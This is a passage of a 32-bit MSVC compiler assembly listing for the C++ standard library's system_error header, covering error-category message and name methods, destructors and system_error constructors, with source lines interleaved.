?default_error_condition@_System_error_category@std@@UBE?AVerror_condition@2@H@Z PROC ; std::_System_error_category::default_error_condition, COMDAT
; _this$ = ecx

; 594  :     _NODISCARD error_condition default_error_condition(int _Errval) const noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 595  :         if (_Errval == 0) {

  00009	83 7d 0c 00	 cmp	 DWORD PTR __Errval$[ebp], 0
  0000d	75 15		 jne	 SHORT $LN2@default_er

; 596  :             return error_condition(0, _STD generic_category());

  0000f	e8 00 00 00 00	 call	 ?generic_category@std@@YAABVerror_category@1@XZ ; std::generic_category
  00014	50		 push	 eax
  00015	6a 00		 push	 0
  00017	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0001a	e8 00 00 00 00	 call	 ??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
  0001f	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00022	eb 43		 jmp	 SHORT $LN4@default_er
$LN2@default_er:

; 597  :         }
; 598  : 
; 599  :         // make error_condition for error code (generic if possible)
; 600  :         const int _Posv = _Winerror_map(_Errval);

  00024	8b 45 0c	 mov	 eax, DWORD PTR __Errval$[ebp]
  00027	50		 push	 eax
  00028	e8 00 00 00 00	 call	 ?_Winerror_map@std@@YAHH@Z ; std::_Winerror_map
  0002d	83 c4 04	 add	 esp, 4
  00030	89 45 fc	 mov	 DWORD PTR __Posv$[ebp], eax

; 601  :         if (_Posv == 0) {

  00033	83 7d fc 00	 cmp	 DWORD PTR __Posv$[ebp], 0
  00037	75 19		 jne	 SHORT $LN3@default_er

; 602  :             return error_condition(_Errval, _STD system_category());

  00039	e8 00 00 00 00	 call	 ?system_category@std@@YAABVerror_category@1@XZ ; std::system_category
  0003e	50		 push	 eax
  0003f	8b 4d 0c	 mov	 ecx, DWORD PTR __Errval$[ebp]
  00042	51		 push	 ecx
  00043	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00046	e8 00 00 00 00	 call	 ??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
  0004b	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  0004e	eb 17		 jmp	 SHORT $LN4@default_er

; 603  :         } else {

  00050	eb 15		 jmp	 SHORT $LN4@default_er
$LN3@default_er:

; 604  :             return error_condition(_Posv, _STD generic_category());

  00052	e8 00 00 00 00	 call	 ?generic_category@std@@YAABVerror_category@1@XZ ; std::generic_category
  00057	50		 push	 eax
  00058	8b 55 fc	 mov	 edx, DWORD PTR __Posv$[ebp]
  0005b	52		 push	 edx
  0005c	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0005f	e8 00 00 00 00	 call	 ??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
  00064	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN4@default_er:

; 605  :         }
; 606  :     }

  00067	8b e5		 mov	 esp, ebp
  00069	5d		 pop	 ebp
  0006a	c2 08 00	 ret	 8
?default_error_condition@_System_error_category@std@@UBE?AVerror_condition@2@H@Z ENDP ; std::_System_error_category::default_error_condition
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
_TEXT	SEGMENT
__Msg$ = -16						; size = 8
__Unknown_error_length$1 = -8				; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errcode$ = 12						; size = 4
?message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z PROC ; std::_System_error_category::message, COMDAT
; _this$ = ecx

; 582  :     _NODISCARD string message(int _Errcode) const override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 583  :         const _System_error_message _Msg(static_cast<unsigned long>(_Errcode));

  00009	8b 45 0c	 mov	 eax, DWORD PTR __Errcode$[ebp]
  0000c	50		 push	 eax
  0000d	8d 4d f0	 lea	 ecx, DWORD PTR __Msg$[ebp]
  00010	e8 00 00 00 00	 call	 ??0_System_error_message@std@@QAE@K@Z ; std::_System_error_message::_System_error_message

; 584  :         if (_Msg._Length == 0) {

  00015	83 7d f4 00	 cmp	 DWORD PTR __Msg$[ebp+4], 0
  00019	75 25		 jne	 SHORT $LN2@message

; 585  :             static constexpr char _Unknown_error[] = "unknown error";
; 586  :             constexpr size_t _Unknown_error_length = sizeof(_Unknown_error) - 1; // TRANSITION, DevCom-906503

  0001b	c7 45 f8 0d 00
	00 00		 mov	 DWORD PTR __Unknown_error_length$1[ebp], 13 ; 0000000dH

; 587  :             return string{_Unknown_error, _Unknown_error_length};

  00022	6a 0d		 push	 13			; 0000000dH
  00024	68 00 00 00 00	 push	 OFFSET ?_Unknown_error@?4??message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_System_error_category::message'::`5'::_Unknown_error
  00029	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0002c	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00031	8d 4d f0	 lea	 ecx, DWORD PTR __Msg$[ebp]
  00034	e8 00 00 00 00	 call	 ??1_System_error_message@std@@QAE@XZ ; std::_System_error_message::~_System_error_message
  00039	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  0003c	eb 27		 jmp	 SHORT $LN1@message

; 588  :         } else {

  0003e	eb 1d		 jmp	 SHORT $LN3@message
$LN2@message:

; 589  :             _STL_INTERNAL_CHECK(_Msg._Str != nullptr);
; 590  :             return string{_Msg._Str, _Msg._Length}; // lgtm [cpp/uninitializedptrfield]

  00040	8b 4d f4	 mov	 ecx, DWORD PTR __Msg$[ebp+4]
  00043	51		 push	 ecx
  00044	8b 55 f0	 mov	 edx, DWORD PTR __Msg$[ebp]
  00047	52		 push	 edx
  00048	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0004b	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00050	8d 4d f0	 lea	 ecx, DWORD PTR __Msg$[ebp]
  00053	e8 00 00 00 00	 call	 ??1_System_error_message@std@@QAE@XZ ; std::_System_error_message::~_System_error_message
  00058	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  0005b	eb 08		 jmp	 SHORT $LN1@message
$LN3@message:

; 591  :         }
; 592  :     }

  0005d	8d 4d f0	 lea	 ecx, DWORD PTR __Msg$[ebp]
  00060	e8 00 00 00 00	 call	 ??1_System_error_message@std@@QAE@XZ ; std::_System_error_message::~_System_error_message
$LN1@message:
  00065	8b e5		 mov	 esp, ebp
  00067	5d		 pop	 ebp
  00068	c2 08 00	 ret	 8
?message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ENDP ; std::_System_error_category::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?name@_System_error_category@std@@UBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?name@_System_error_category@std@@UBEPBDXZ PROC		; std::_System_error_category::name, COMDAT
; _this$ = ecx

; 578  :     _NODISCARD const char* name() const noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 579  :         return "system";

  00007	b8 00 00 00 00	 mov	 eax, OFFSET ??_C@_06FHFOAHML@system@

; 580  :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?name@_System_error_category@std@@UBEPBDXZ ENDP		; std::_System_error_category::name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Iostream_error_category2@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_Iostream_error_category2@std@@UAEPAXI@Z PROC	; std::_Iostream_error_category2::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Iostream_error_category2@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 08		 push	 8
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_Iostream_error_category2@std@@UAEPAXI@Z ENDP	; std::_Iostream_error_category2::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_Iostream_error_category2@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Iostream_error_category2@std@@UAE@XZ PROC		; std::_Iostream_error_category2::~_Iostream_error_category2, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1error_category@std@@UAE@XZ ; std::error_category::~error_category
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1_Iostream_error_category2@std@@UAE@XZ ENDP		; std::_Iostream_error_category2::~_Iostream_error_category2
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
_TEXT	SEGMENT
__Iostream_error_length$1 = -8				; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errcode$ = 12						; size = 4
?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z PROC ; std::_Iostream_error_category2::message, COMDAT
; _this$ = ecx

; 563  :     _NODISCARD string message(int _Errcode) const override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 564  :         if (_Errcode == static_cast<int>(io_errc::stream)) {

  00009	83 7d 0c 01	 cmp	 DWORD PTR __Errcode$[ebp], 1
  0000d	75 1d		 jne	 SHORT $LN2@message

; 565  :             static constexpr char _Iostream_error[] = "iostream stream error";
; 566  :             constexpr size_t _Iostream_error_length = sizeof(_Iostream_error) - 1; // TRANSITION, DevCom-906503

  0000f	c7 45 f8 15 00
	00 00		 mov	 DWORD PTR __Iostream_error_length$1[ebp], 21 ; 00000015H

; 567  :             return string{_Iostream_error, _Iostream_error_length};

  00016	6a 15		 push	 21			; 00000015H
  00018	68 00 00 00 00	 push	 OFFSET ?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
  0001d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00020	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00025	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00028	eb 1a		 jmp	 SHORT $LN3@message

; 568  :         } else {

  0002a	eb 18		 jmp	 SHORT $LN3@message
$LN2@message:

; 569  :             return _Syserror_map(_Errcode);

  0002c	8b 45 0c	 mov	 eax, DWORD PTR __Errcode$[ebp]
  0002f	50		 push	 eax
  00030	e8 00 00 00 00	 call	 ?_Syserror_map@std@@YAPBDH@Z ; std::_Syserror_map
  00035	83 c4 04	 add	 esp, 4
  00038	50		 push	 eax
  00039	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0003c	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00041	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN3@message:

; 570  :         }
; 571  :     }

  00044	8b e5		 mov	 esp, ebp
  00046	5d		 pop	 ebp
  00047	c2 08 00	 ret	 8
?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ENDP ; std::_Iostream_error_category2::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?name@_Iostream_error_category2@std@@UBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?name@_Iostream_error_category2@std@@UBEPBDXZ PROC	; std::_Iostream_error_category2::name, COMDAT
; _this$ = ecx

; 559  :     _NODISCARD const char* name() const noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 560  :         return "iostream";

  00007	b8 00 00 00 00	 mov	 eax, OFFSET ??_C@_08LLGCOLLL@iostream@

; 561  :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?name@_Iostream_error_category2@std@@UBEPBDXZ ENDP	; std::_Iostream_error_category2::name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Generic_error_category@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_Generic_error_category@std@@UAEPAXI@Z PROC		; std::_Generic_error_category::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Generic_error_category@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 08		 push	 8
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_Generic_error_category@std@@UAEPAXI@Z ENDP		; std::_Generic_error_category::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_Generic_error_category@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Generic_error_category@std@@UAE@XZ PROC		; std::_Generic_error_category::~_Generic_error_category, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1error_category@std@@UAE@XZ ; std::error_category::~error_category
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1_Generic_error_category@std@@UAE@XZ ENDP		; std::_Generic_error_category::~_Generic_error_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?message@_Generic_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errcode$ = 12						; size = 4
?message@_Generic_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z PROC ; std::_Generic_error_category::message, COMDAT
; _this$ = ecx

; 550  :     _NODISCARD string message(int _Errcode) const override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 551  :         return _Syserror_map(_Errcode);

  00007	8b 45 0c	 mov	 eax, DWORD PTR __Errcode$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ?_Syserror_map@std@@YAPBDH@Z ; std::_Syserror_map
  00010	83 c4 04	 add	 esp, 4
  00013	50		 push	 eax
  00014	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00017	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  0001c	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 552  :     }

  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 08 00	 ret	 8
?message@_Generic_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ENDP ; std::_Generic_error_category::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?name@_Generic_error_category@std@@UBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?name@_Generic_error_category@std@@UBEPBDXZ PROC	; std::_Generic_error_category::name, COMDAT
; _this$ = ecx

; 546  :     _NODISCARD const char* name() const noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 547  :         return "generic";

  00007	b8 00 00 00 00	 mov	 eax, OFFSET ??_C@_07DCLBNMLN@generic@

; 548  :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?name@_Generic_error_category@std@@UBEPBDXZ ENDP	; std::_Generic_error_category::name
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??1_System_error_message@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_System_error_message@std@@QAE@XZ PROC		; std::_System_error_message::~_System_error_message, COMDAT
; _this$ = ecx

; 537  :     ~_System_error_message() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 538  :         _CSTD __std_system_error_deallocate_message(_Str);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000c	51		 push	 ecx
  0000d	e8 00 00 00 00	 call	 ___std_system_error_deallocate_message@4

; 539  :     }

  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??1_System_error_message@std@@QAE@XZ ENDP		; std::_System_error_message::~_System_error_message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0_System_error_message@std@@QAE@K@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ec$ = 8						; size = 4
??0_System_error_message@std@@QAE@K@Z PROC		; std::_System_error_message::_System_error_message, COMDAT
; _this$ = ecx

; 531  :     explicit _System_error_message(const unsigned long _Ec) noexcept

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 532  :         : _Str(nullptr), _Length(_CSTD __std_system_error_allocate_message(_Ec, &_Str)) {}

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	51		 push	 ecx
  00014	8b 55 08	 mov	 edx, DWORD PTR __Ec$[ebp]
  00017	52		 push	 edx
  00018	e8 00 00 00 00	 call	 ___std_system_error_allocate_message@8
  0001d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00020	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00023	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 04 00	 ret	 4
??0_System_error_message@std@@QAE@K@Z ENDP		; std::_System_error_message::_System_error_message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?_Throw_system_error@std@@YAXW4errc@1@@Z
_TEXT	SEGMENT
$T1 = -28						; size = 20
$T2 = -8						; size = 8
__Ec$ = 8						; size = 4
?_Throw_system_error@std@@YAXW4errc@1@@Z PROC		; std::_Throw_system_error, COMDAT

; 520  : [[noreturn]] inline void _Throw_system_error(const errc _Ec) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH

; 521  :     _THROW(system_error{_STD make_error_code(_Ec)});

  00006	8b 45 08	 mov	 eax, DWORD PTR __Ec$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d f8	 lea	 ecx, DWORD PTR $T2[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 ?make_error_code@std@@YA?AVerror_code@1@W4errc@1@@Z ; std::make_error_code
  00013	83 c4 08	 add	 esp, 8
  00016	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00019	52		 push	 edx
  0001a	8b 00		 mov	 eax, DWORD PTR [eax]
  0001c	50		 push	 eax
  0001d	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00020	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@Verror_code@1@@Z ; std::system_error::system_error
  00025	68 00 00 00 00	 push	 OFFSET __TI4?AVsystem_error@std@@
  0002a	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  0002d	51		 push	 ecx
  0002e	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN1@Throw_syst:

; 522  : }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c3		 ret	 0
?_Throw_system_error@std@@YAXW4errc@1@@Z ENDP		; std::_Throw_system_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gsystem_error@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gsystem_error@std@@UAEPAXI@Z PROC			; std::system_error::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1system_error@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 14		 push	 20			; 00000014H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gsystem_error@std@@UAEPAXI@Z ENDP			; std::system_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0system_error@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0system_error@std@@QAE@ABV01@@Z PROC			; std::system_error::system_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0_System_error@std@@QAE@ABV01@@Z
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7system_error@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0system_error@std@@QAE@ABV01@@Z ENDP			; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1system_error@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1system_error@std@@UAE@XZ PROC			; std::system_error::~system_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_System_error@std@@UAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1system_error@std@@UAE@XZ ENDP			; std::system_error::~system_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0system_error@std@@QAE@Verror_code@1@PBD@Z
_TEXT	SEGMENT
_this$ = -32						; size = 4
$T1 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Errcode$ = 8						; size = 8
__Message$ = 16						; size = 4
??0system_error@std@@QAE@Verror_code@1@PBD@Z PROC	; std::system_error::system_error, COMDAT
; _this$ = ecx

; 498  :     system_error(error_code _Errcode, const char* _Message) : _Mybase(_Errcode, _Message) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 20	 sub	 esp, 32			; 00000020H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx
  00013	8b 45 10	 mov	 eax, DWORD PTR __Message$[ebp]
  00016	50		 push	 eax
  00017	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  0001a	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  0001f	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00022	51		 push	 ecx
